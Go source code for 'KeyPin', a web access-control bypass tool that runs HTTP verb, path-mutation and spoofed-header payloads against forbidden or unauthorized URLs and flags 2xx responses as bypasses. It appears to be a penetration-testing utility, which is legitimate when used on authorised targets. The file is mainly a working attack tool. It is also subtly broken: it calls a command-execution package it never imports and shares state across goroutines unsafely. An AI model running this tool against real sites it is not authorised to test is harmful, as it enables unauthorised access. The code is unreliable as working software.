//usr/bin/env go run $0 "$@"; exit
package main



/*						  	
							  _____________________________________________
							 |_Blueprint_for_KeyPin_process_and_task_order_|

KeyPin is an 403/401 bypass tool which tries to bypass forbidden, unauthorized and unauthenticated pages in different ways.
					 
				(1) It first use a base to detect the server configure and behavior.
				 	 When the ground scan is done (Possible bypassed as well, if so it will end in early state)

	 			(2) After the ground scan KeyPin combines the techniques to adjust future scans better.
	 			 	Example if HTTP methods "GET" and "POST" are both successfull. KeyPin will try to detect if a different
	 			 	behavior accure when adding headers or parameters. If so it will inform the user that a possible 
	 			 	misconfiguration is in place.


 ________________						 ______________________ 
|			 	 |	   ___________		|					   |
|  KeyPin start  |----[_Configure_]---->|  Bypass techniques   |
|________________|						|______________________|
										 |	       _______________             _____________________
										 |<------>[_Verbs_methods_]<--------->[_Check_valid_methods_]	
										 |            _______                  __________________________________________________________
										 |---------->[_Paths_]<-------------->[_Try_to_detect_filter_misconfigure_for_the_forbidden_path_]
										 |          ____________               ________________________________________________________
										 |-------->[_Extensions_]<----------->[_Try_to_take_advantage_of_cache_or_whitelist_extensions_]
										 |           _________                 ___________________________________
										 |<-------->[_Headers_]<------------->[_Try_to_bypass_the_IP/host_filters_]
								         |    _________________________        _______________________________
									     |-->[_Cacheable_hidden_access_]<---->[_Cache_hidden_access_detection_]
										 |
 __________________	   				 ____v________________________________________________________
|		           |	    		|															  |
|  Output to file  |<---------------|  Combine techniques depending on the results and loop again |
|__________________| 				|_____________________________________________________________|
		 |
    	 |
   ______v_______
  |_Coffee_pause_| 


 . Author: Brumens
 · Version: 1.0

*/

import (
	"os"
	"fmt"
	"net"
	"flag"
	"time"
	"sync"
	"bufio"
	"regexp"
	"strings"
	"strconv"
	"net/http"
	"crypto/tls"
	)

//Global static variable:

//Colors:
var WHITE = "\033[0m"
var GREEN = "\033[32m"
var BLUE = "\033[36m"
var RED = "\033[31m"
var ORANGE = "\033[33m"

//Icons:
var FAILED = "\033[31mx\033[0m"


//List & variables declaration:
type storage struct {

	//Dynamic variables:
	path string
	payload string
	verbose string
	header string
	headerValue string
	headerStatic string
	vulnerable string
	userAgent string

	timer int
	count int
	mode int

	tech_method bool
	tech_header bool

	//List with file data:
	lst_rua []string
	lst_verbs []string
	lst_paths []string
	lst_headers []string
	lst_protocols []string
	lst_name []string
	
	//List with filters & techniques:
	//lst_technique []string
	lst_blacklist []int
	
	lst_validMethod []string


}

//User arguments - [OPTIONS]
type options struct {

	url string
	url_file string
	path string
	method string

	threads int
	timeout int
	delay int
	
	cookie string
	header string

	cache bool
	verbose bool
	redirect bool
	verbose_error bool

	output string

}

type Client struct {
	
	client *http.Client
}


//Run KeyPin with it's linked functions:
func main() {

	ShowBanner()
	fmt.Println("Stay ethical. You are responsible for your actions.\r\n",
	"\rthe creator of the tool is not responsible for any misuse or damage.\n\r")

	client := client()
	opt := parse()
	st := storage_define()

	//Craft list for each technique that contains it's payloads:
	setup_lists(st)


	//Display the configuration to the user:
	config_Check(opt, st)


	//Calculate the process time:
	ProcessTime_Start := time.Now()


	//Combine techniqes into one list with diffierent sets:
	techq := make(map[int][]string)
	techq[0] = st.lst_verbs
	techq[1] = st.lst_paths
	techq[2] = st.lst_headers

	T := 0

	var wg sync.WaitGroup

	//Check if all verbs should be used or a static provided by the user:
	if opt.method == "all" {
		//Check valid HTTP methods (Verbs) in general for the domain:
		for vb := 0; vb != len(techq[0]); vb++ {
			opt.method = techq[0][vb]
			st.payload = opt.method

			//Add general valid HTTP methods to future scans:
			if request(client, opt, st) == "valid" {
				fmt.Print(st.verbose, " :: \033[36mGeneral valid HTTP method found\033[0m\n")
				st.lst_validMethod = append(st.lst_validMethod, st.payload)
			}else {continue}
		}

	//If user choice Verb only use that one:
	}else {
		st.lst_validMethod = append(st.lst_validMethod, opt.method)		
	}

	//Run a loop with all techniques: "techq[T]":
	for; T != 3; T++ {
		 
		//Rung all payloads that are in the specific file for the technique:
		for payload := 0; payload != len(techq[T]); payload ++ {
			time.Sleep(time.Duration(opt.delay))
			wg.Add(1)

			go func() {
				defer wg.Done()

				//Bypass techniques:
				switch; T {
					case 0: //(1) Verbs
						opt.method = techq[T][payload]
						st.payload = opt.method
						st.path = opt.path

						if request(client, opt, st) == "valid" {

							fmt.Print(st.verbose, " :: \033[1;32mBypassed\033[0m\n")
						}else {return}		

					case 1: //(2) Paths, Extensions & Cache Posioning
						st.path = techq[T][payload]
						st.path = strings.Replace(st.path, "__PATH__", opt.path, -1)
						st.payload = st.path
						/*
						if cacheTechnique == true {
							st.path += 
							st.payload += 
						}*/

					case 2: //(5) Headers
						st.path = opt.path
						st.header = techq[T][payload]
						st.header = strings.Replace(st.header, "__PATH__", opt.path, -1)
						st.payload = st.header
				}


				//Valid HTTP methods to test techniques and payloads with:
				if T != 0 {
					for _, opt.method = range(st.lst_validMethod) {

						//Call the "Request" function & ignore failed response that either was block/timeout by the target:
						if request(client, opt, st) == "valid" {

							fmt.Print(st.verbose, " :: \033[1;32mBypassed\033[0m\n")
						}else {continue}
					}
				}
			}()
			//ADD "SELECT CASE" STATMENT END A RETURN VALUE FOR THE FUNCTION REQUST TO CHECK X4.
			wg.Wait()
		}
	}



	// Calculate finish time
	var ProcessTime_End time.Duration = time.Since(ProcessTime_Start)

	//Process finished, Display summary verbose information:
	fmt.Println("\n:: Process finished successfully.")
	fmt.Printf("Requests: [%v] - [%v]s\n", st.count, ProcessTime_End.Seconds()) // <=====[FIX TIME]
}


/*================================[Functions]================================*/

//Client setup
func client() *http.Client {

	client := &http.Client{
		CheckRedirect: func(req *http.Request, via []*http.Request) error { return http.ErrUseLastResponse },
		Timeout:	10 * time.Second,
		Transport: &http.Transport{
			MaxIdleConns:        1000,
			MaxIdleConnsPerHost: 500,
			MaxConnsPerHost:     500,
			DialContext: (&net.Dialer{
				Timeout: 10 * time.Second,
			}).DialContext,
			TLSHandshakeTimeout: 10 * time.Second,
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true,
				Renegotiation: tls.RenegotiateOnceAsClient,
			},
		},
	}
	return client
}

//Store the list & variables:
func storage_define() *storage {
	st := &storage{}

	st.verbose = ""
	st.payload = ""
	st.path = ""
	st.header = ""
	st.headerValue = "127.1"
	st.headerStatic = ""
	st.vulnerable = ""

	//Will be fixed to a static/random user-agent option soon:
	st.userAgent = "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.29 Safari/525.13"

	st.mode = 0
	st.count = 0

	st.tech_method = false
	st.tech_header = false

	st.lst_rua = []string{}
	st.lst_verbs = []string{}
	st.lst_paths = []string{}
	st.lst_protocols = []string{}
	st.lst_name = []string{}

	//st.lst_technique = []string{"Verb method", "Protocol", "Path", "Extension", "Header", "Cache Posioning"} 
	st.lst_blacklist =[]int{403, 401, 404, 400}

	st.lst_validMethod = []string{}

	return st
}

//UserOptions (Arguments):
func parse() *options{
	opt := &options{}

	flag.StringVar(&opt.url, "u", "", "url to test on [\033[33mEx: \"https://www.target.com\"\033[0m]")
	flag.StringVar(&opt.url_file, "l", "", "[\033[31mIn Process + pipeline support\033[0m] File with urls to test [\033[33mEx: \"urls.txt\"\033[0m]")
	flag.StringVar(&opt.path, "p", "", "path to bypass [\033[33mEx: \"admin\"\033[0m]")
	flag.StringVar(&opt.method, "m", "all", "HTTP method to use [\033[33mEx: \"GET\", \"POST\", \"HEAD\" ... or \"all\"\033[0m]\n")
   	flag.IntVar(&opt.timeout, "T", 1000, "Time to wait in (ms) before giving up on the response. \"0 = Unfinity\" (Not recommended!)\"]\n")
    flag.IntVar(&opt.delay, "d", 0, "Delay between requests in (ms)\n")
	flag.StringVar(&opt.header, "H", "", "Custom static header to use together with all bypass techniques\n[\033[33mEx: \"{HEADER_NAME}={VALUE}\"\033[0m] or use \",\" to add more static headers")
    //flag.BoolVar(&opt.redirect, "fr", true, "Follow redirects to better detect false positives")
	flag.BoolVar(&opt.cache, "C", false, "[\033[31mIn Process\033[0m] Cached response technique. KeyPin will use a random (\"?{PARAM}={VALUE}\") at the end of the url\n[\033[33mEx: \"https://www.target.com/admin?qewnje=8542\"\033[0m]\n")
 	flag.BoolVar(&opt.verbose, "v", false, "Enable verbose mode (Show each request and it's response information)\n")
 	flag.BoolVar(&opt.verbose_error, "e", false, "Enable verbose mode to show errors when/if it occurs. (Can be useful to troubleshoot)\n")
    //flag.StringVar(&opt.output, "o", "", "output the result to a file [\033[33mEx: /home/output.txt\033[0m]\n")
	flag.Parse()

	return opt
}

// [] Setting up custom help menu:
func flagUsage() {
	
	flag.Usage = func() {
		fmt.Printf(`
 KeyPin is an 403/401 bypass tool which tries to bypass forbidden, unauthorized and unauthenticated pages in different ways.

 %vIt first use a ground scan to try detect the server configure and behavior. When the ground scan is done(Possible bypassed
 as well, if so it will end in it's early state). After the ground scan KeyPin combines the techniques to adjust future scans
 better. Example if HTTP methods "GET" and "POST" are both successfull. KeyPin will try to detect if a different behavior
 accure when adding headers or parameters. If so it will inform the user that a possible misconfiguration is in place.%v
		
 `,"\033[2m", "\033[0m")

    	fmt.Fprintf(os.Stderr, "Use: ./keypin -u <URL> -p <PARAM> ... [OPTIONS].\n")
		flag.PrintDefaults()
	}
}



// [] Requesting the target:
func request(client *http.Client, opt *options, st *storage) string{
	st.count++

	//Configure the request:
	req, err := http.NewRequest(opt.method, opt.url+st.path, nil)
	req.Header.Set("User-Agent", st.userAgent)

	//Add bypass headers if "case 2" in "main()" is running only:
	if st.header != "" {
		h := strings.Split(st.header, " ")
		req.Header.Set(h[0], h[1])
	}

	//Check request error:
	if err != nil {
		if opt.verbose == true{fmt.Printf(":: \033[1;31mRequest Error\033[0m > [\"\033[1;31m%v\033[0m\", payload: %v]\n", err, st.payload)}
		return "continue"
	}


	//Make the request and calculate response time:
	start := time.Now()
	resp, err := client.Do(req)


	//Check response error
	if err != nil {
		if opt.verbose == true{fmt.Printf(":: \033[1;31mResponse Error\033[0m > [\"\033[1;31m%v\033[0m, payload: %v]\n", err, st.payload)}
		return "continue"
	}
	defer resp.Body.Close()
	resp_time := time.Since(start)
	

	resp_re, _ := resp.Location()
	resp_redirect := ""

	if resp_re != nil {
		resp_redirect = fmt.Sprintf("-> %v", resp_re)
	
	}


	//Store Verbose of response:
	st.verbose = fmt.Sprintf(":%v: %v \033[36m%v\033[0m\t·-· [ Method: %v, Status: %v, RespTime: %v, Payload: \"%v\" ]", st.count, resp.Request.URL, resp_redirect, opt.method, resp.StatusCode, resp_time, st.payload)

	//Check status codes from response by regrex:
	regex_success := regexp.MustCompile(`20\d`)
	regex_redirect := regexp.MustCompile(`30\d`)

	//StatusCode == 200 (Successfull)
	if regex_success.MatchString(strconv.Itoa(resp.StatusCode)) == true {
		return "valid"


	//StatusCode == 300 (Redirect)
	}else if regex_redirect.MatchString(strconv.Itoa(resp.StatusCode)) == true {
		fmt.Print(st.verbose, ":: \033[36mPossible bypass\033[0m\n")
		return "done"

	}

	//Verbose output:
	if opt.verbose != true {
		fmt.Printf("%v \033[\033[K\r",st.verbose)
	}else{
		fmt.Printf(st.verbose)
	}

	return "done"
}


// [] Show the user configure that the tool will relay on:
func config_Check(opt *options, st *storage) {


	//Check so everything is proberly configured by the user:
	if opt.url == "" {
		fmt.Println("Use: ./keypin -u <Domain> -p <Path> [OPTIONS] ...")
		fmt.Printf(":: View help menu for more options [ %v-h%v ]\n", ORANGE, WHITE)
		os.Exit(0)
	}

	//Checking that the url has a HTTP protocol:
	valid_url, _ := regexp.MatchString(".*://", opt.url)
	if valid_url == false {
		fmt.Println("HTTP protocol is needed for:", opt.url)
		os.Exit(0)
	}



	//Check if the path is given:
	if len(opt.path) > 0 {
		//Check if it starts with "/" otherwise add it:
		if opt.path[0:1] != "/" {
			opt.path = "/"+opt.path
		}

	//If path has length zero == nothing. Warn the user:
	}else {
		fmt.Printf("\n:%v: WARNING no \"path\" has been set.\n", FAILED)
		time.Sleep(2 * time.Second)
	}


	//Information & user configure output:
	fmt.Print("\n",strings.Repeat("_", 64),"\n")
	fmt.Printf(""+
	"\r· url      \t\t: %v\n"+
	"\r· Path:    \t\t: %v\n"+
	"\r· Method:  \t\t: %v\n"+
	"\r· Verbose: \t\t: %v\n"+
	"\r· Timeout: \t\t: %vms\n"+
	"\r· Delay:   \t\t: %vms\n"+
	"\r· Header:  \t\t: %v\n"+
	//"\r· User-Agents:         : %v\n"+
	"\r· Output:  \t\t: %v\n"+
	"", opt.url, opt.path, opt.method, opt.verbose, opt.timeout, opt.delay, opt.header, opt.output)
	fmt.Print(strings.Repeat("_", 64),"\n")
}


// [] User agent to list:
func setup_lists(st *storage) {
	//Execute "whoami" to get the user name and to make a $HOME variable
	WHOAMI, _ := exec.Command("whoami").Output()
	path := fmt.Sprintf("/home/%v/.config/keypin/conf/db/", string(WHOAMI))
	path = strings.Replace(path, "\n", "", 1)
	
	lst_files := []string{"rua.txt", "path_bypass.txt", "verb_bypass.txt", "headers_bypass.txt"}

	for i := 0; i < len(lst_files); i++ {

		file_input, _ := os.Open(path+lst_files[i])
		scanner := bufio.NewScanner(file_input)

   		for scanner.Scan() {
   			if scanner.Text() != "" && scanner.Text() != "\n" && scanner.Text()[0:2] != "##" {
        		st.lst_name = append(st.lst_name, scanner.Text())
   			}
    	}

    	switch nr := i; nr {
			case 0: 
				st.lst_rua = st.lst_name
			case 1:
				st.lst_paths = st.lst_name
			case 2:
				st.lst_verbs = st.lst_name
			case 3:
				st.lst_headers = st.lst_name
    	}

    	st.lst_name = nil
	}
}


// [] Banner design:
func ShowBanner() {
	fmt.Printf(`
                                   %v___
                                 ,/ __¨\%v
   __  __     ______     __  __  %v\\ \´\ \%v   __     __   __    
  /\ \/ /    /\  ___\   /\ \_\ \  %v\\_¨¨ /%v  /\ \   /\ '-.\ \   
  \ \  _'-.  \ \  __\   \ \___, \  %v¨”\\ \%v  \ \ \  \ \ \-.  \  
   \ \_\ \_\  \ \_____\  \/\_____\    %v\\ l%v  \ \_\  \ \_\\'\_\ 
    \/_/\/_/   \/_____/   \/_____/     %v\\ l%v  \/_/   \/_/ \/_/ 
                                        %v\\_l%v
                         Version: %v1%v.0   %v¨¨¨%v
                         Author: Brumens%v`,
	ORANGE, WHITE, ORANGE, WHITE, ORANGE, WHITE, ORANGE, WHITE, ORANGE, WHITE, ORANGE, WHITE, ORANGE, WHITE, ORANGE, WHITE, ORANGE, WHITE, "\n")
}
